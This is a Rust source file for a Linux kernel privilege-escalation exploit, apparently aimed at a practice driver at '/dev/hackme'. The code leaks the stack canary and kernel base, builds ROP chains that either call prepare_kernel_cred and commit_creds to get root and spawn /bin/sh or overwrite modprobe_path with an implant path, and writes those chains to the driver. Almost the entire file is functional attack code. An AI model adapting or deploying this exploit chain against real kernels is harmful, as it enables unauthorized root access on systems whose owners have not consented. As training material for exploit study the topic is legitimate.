#![feature(slice_flatten)]

use std::arch::asm;
use std::fs::{File, OpenOptions};
use std::io::prelude::*;
use std::os::unix::process::CommandExt;
use std::process::Command;

mod fgkaslr;
mod leaks;
mod modprobe;

const VULN_DRIVER: &str = "/dev/hackme";
const CANARY_OFF: usize = 0x80;

const IMPLANT: &[u8; 8] = b"/tmp/im\0";

fn main() {
    let mut args = std::env::args();
    let me = args.next().unwrap();
    let cmd = args.next();

    let mut drv = open_driver();
    match cmd.as_deref() {
        Some("leak") => leaks::leak_kstack(&mut drv),
        Some("static") => pwn_static(&mut drv),
        Some("dynamic") => pwn_dynamic(&mut drv),
        _ => eprintln!("Usage: {me} <leak|static|dynamic>"),
    }
}

fn open_driver() -> File {
    OpenOptions::new()
        .read(true)
        .write(true)
        .open(VULN_DRIVER)
        .expect("driver exists and can be opened")
}

fn pwn_dynamic(drv: &mut File) {
    let canary = leaks::leak_canary(drv);
    let base = leaks::leak_base(drv);
    unsafe { save_state() };

    // Kernel symbols
    let swapgs_return_usermode = base + 0x200f10;
    let modprobe_path = base + 0x1061820;

    // ROP gadgets
    let pop_rsi = base + 0x1bae6; // pop rsi; pop rbp; ret;
    let pop_rax = base + 0x4d11; // pop rax; ret;
    let mov_rsi_rax = base + 0x15dc7; // mov [rsi] rax; pop rbp; ret;

    const OFF: usize = CANARY_OFF / 8;
    const N: usize = OFF + 20;

    eprintln!("[+] Preparing the payload");
    let mut payload = [0; N];
    payload[OFF] = canary;
    payload[OFF + 1] = 0x4141414141414141; // rbx
    payload[OFF + 2] = 0x4242424242424242; // r12
    payload[OFF + 3] = 0x4343434343434343; // rbp

    // Overwrite modprobe_path with the path of the implant
    payload[OFF + 4] = pop_rsi;
    payload[OFF + 5] = modprobe_path;
    payload[OFF + 6] = 0x4343434343434343; // rbp
    payload[OFF + 7] = pop_rax;
    payload[OFF + 8] = usize::from_ne_bytes(*IMPLANT);
    payload[OFF + 9] = mov_rsi_rax; // rbp
    payload[OFF + 10] = 0x4343434343434343; // rbp

    // swapgs_restore_and_return_to_usermode()
    payload[OFF + 11] = swapgs_return_usermode + 22;
    payload[OFF + 12] = 0x4545454545454545; // rax
    payload[OFF + 13] = 0x4646464646464646; // rdi
    payload[OFF + 14] = modprobe::abuse_modprobe as usize;
    unsafe {
        payload[OFF + 15] = USER_CS;
        payload[OFF + 16] = USER_RFLAGS;
        payload[OFF + 17] = USER_RSP;
        payload[OFF + 18] = USER_SS;
    }

    eprintln!("[+] Writing the payload");
    let bytes = payload.map(|e| e.to_ne_bytes());
    let bytes = bytes.flatten();
    drv.write_all(bytes).expect("driver supports writing");
}

fn pwn_static(drv: &mut File) {
    // Kernel functions
    const PREPARE_KERNEL_CRED: usize = 0xffffffff814c67f0;
    const COMMIT_CREDS: usize = 0xffffffff814c6410;
    const SWAPGS_RESTORE_RETURN_USERMODE: usize = 0xffffffff81200f10;

    // ROP gadgets
    const POP_RDI_RET: usize = 0xffffffff8100767b; // pop rdx; pop rdi; ret;
    const MOV_RDI_RAX: usize = 0xffffffff816bf203; // mov rdi, rax; mov [rsi+0x140], rdi; pop rbp; ret;

    const OFF: usize = CANARY_OFF / 8;
    const N: usize = OFF + 20;

    let canary = leaks::leak_canary(drv);
    unsafe { save_state() };

    eprintln!("[+] Preparing the payload");
    let mut payload = [0; N];
    payload[OFF] = canary;
    payload[OFF + 1] = 0x4141414141414141; // rbx
    payload[OFF + 2] = 0x4242424242424242; // r12
    payload[OFF + 3] = 0x4343434343434343; // rbp

    // $cred = prepare_kernel_cred(0)
    payload[OFF + 4] = POP_RDI_RET;
    payload[OFF + 5] = 0x4444444444444444; // rdx
    payload[OFF + 6] = 0x0;
    payload[OFF + 7] = PREPARE_KERNEL_CRED;

    // commit_creds($cred)
    payload[OFF + 8] = MOV_RDI_RAX;
    payload[OFF + 9] = 0x4343434343434343; // rbp
    payload[OFF + 10] = COMMIT_CREDS;

    // swapgs_restore_and_return_to_usermode()
    payload[OFF + 11] = SWAPGS_RESTORE_RETURN_USERMODE + 22;
    payload[OFF + 12] = 0x4545454545454545; // rax
    payload[OFF + 13] = 0x4646464646464646; // rdi
    payload[OFF + 14] = shell as usize;
    unsafe {
        payload[OFF + 15] = USER_CS;
        payload[OFF + 16] = USER_RFLAGS;
        payload[OFF + 17] = USER_RSP;
        payload[OFF + 18] = USER_SS;
    }

    eprintln!("[+] Writing the payload");
    let bytes = payload.map(|e| e.to_ne_bytes());
    let bytes = bytes.flatten();
    drv.write_all(bytes).expect("driver supports writing");
}

static mut USER_CS: usize = 0;
static mut USER_SS: usize = 0;
static mut USER_RSP: usize = 0;
static mut USER_RFLAGS: usize = 0;

unsafe fn save_state() {
    asm!(
        "mov {user_cs}, cs",
        "mov {user_ss}, ss",
        "mov {user_rsp}, rsp",
        "pushf",
        "pop {user_rflags}",
        user_cs = out(reg) USER_CS,
        user_ss = out(reg) USER_SS,
        user_rsp = out(reg) USER_RSP,
        user_rflags = out(reg) USER_RFLAGS,
    );
    eprintln!("[+] Saved register state")
}

fn shell() {
    eprintln!("[+] We are back in userland");
    Command::new("/bin/sh").exec();
}
